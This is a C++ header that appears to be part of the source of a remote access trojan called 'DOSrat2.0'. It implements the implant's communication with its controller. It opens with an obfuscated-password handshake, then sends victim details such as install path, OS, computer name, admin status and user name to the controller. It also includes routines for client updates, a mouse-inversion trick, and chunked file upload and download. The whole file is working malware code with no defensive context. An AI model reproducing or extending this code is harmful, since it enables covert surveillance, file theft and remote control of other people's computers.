#pragma once

class COMUNICAZIONI
{
private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

public:
	struct NewClient
	{
		string Str;
		Json j;
	};

	static bool Inizializzazione(SOCKET Sock)
	{
		DirUtils du;
		SystemUtils su;
		EasyMSGB msgb;

		string Pass = (string)AY_OBFUSCATE("DOSrat2.0");
		char Buff[10];

		TcpIP::SetTimeout(10000, Sock);

		if (send(Sock, Pass.c_str(), 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if (recv(Sock, Buff, 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if ((string)Buff != Pass)
		{
			TerminaConnessione(Sock);
			return false;
		}

		TcpIP::SetTimeout(0, Sock);
		Json data;

		data["InstallPath"] = du.GetFullModuleFilePath();
		data["OS"] = su.GetOS();
		data["PCname"] = su.GetPCName();
		data["UAC"] = (su.CheckUAC()) ? "Admin" : "User";
		data["UserName"] = su.GetCurrentUser();
		data["Versione"] = Version;
		data["VersioneCompatibile"] = VersioneCompatibile;

		TcpIP::SendString(Sock, data.dump());

		return true;
	}

	static bool GetInfo(SOCKET Sock, string Str)
	{
		if (TcpIP::SendString(Sock, Str))
			return true;

		return false;
	}

	static bool InvertMouse(SOCKET Sock, bool MouseStatus)
	{
		if (MouseStatus)
		{
			if (TcpIP::SendString(Sock, "a"))
				return true;
		}
		else
			if (TcpIP::SendString(Sock, "b"))
				return true;

		return false;
	}

	static NewClient UpdateClient(SOCKET Sock)
	{
		string Buff;
		NewClient NC;

		if (TcpIP::RecvString(Sock, Buff))
		{
			NC.Str = Buff;

			if (TcpIP::RecvString(Sock, Buff))
			{
				NC.j = Json::parse(Buff);
				TcpIP::SendString(Sock, "OK");
			}
			else
				TcpIP::SendString(Sock, "NO");
		}
		else
			TcpIP::SendString(Sock, "NO");

		return NC;
	}

	static string PingPong(SOCKET Sock, string Res)
	{
		string Buff = "";

		if (!TcpIP::SendString(Sock, Res))
			return "";

		if (!TcpIP::RecvString(Sock, Buff))
			return "";

		return Buff;
	}

	static bool DownloadFileWithLoading(SOCKET Sock, string& FileName, string& FileContent)
	{
		string strFileSize;
		string Buff = "";

		if (!TcpIP::RecvString(Sock, FileName))
			return false;

		if (!TcpIP::RecvString(Sock, strFileSize))
			return false;

		int FileSize = stoi(strFileSize);

		if (FileSize > 100)
		{
			int ChunkSize = FileSize / 100;
			int ChunkNumber = FileSize / ChunkSize;

			for (int i = 0; i < ChunkNumber; i++)
			{
				if (!TcpIP::RecvString(Sock, Buff))
					return false;

				FileContent += Buff;
				Buff.clear();
			}
		}
		else
		{
			if (!TcpIP::RecvString(Sock, FileContent))
				return false;

		}

		return true;
	}

	static bool UploadFileWithLoading(SOCKET Sock, string FileName, string FileContent)
	{
		string Buff;

		if (!TcpIP::SendString(Sock, FileName))
			return false;

		if (!TcpIP::SendString(Sock, to_string(FileContent.size())))
			return false;

		if (FileContent.size() > 100)
		{
			int ChunkSize = FileContent.size() / 100;
			int ChunkNumber = FileContent.size() / ChunkSize;

			for (int i = 0; i < ChunkNumber; i++)
			{
				if (i + 1 == ChunkNumber)
				{
					if (!TcpIP::SendString(Sock, FileContent.substr(ChunkSize * i)))
						return false;
				}
				else
					if (!TcpIP::SendString(Sock, FileContent.substr(ChunkSize * i, ChunkSize)))
						return false;
			}
		}
		else
		{
			if (!TcpIP::SendString(Sock, FileContent))
				return false;
		}

		return true;
	}
};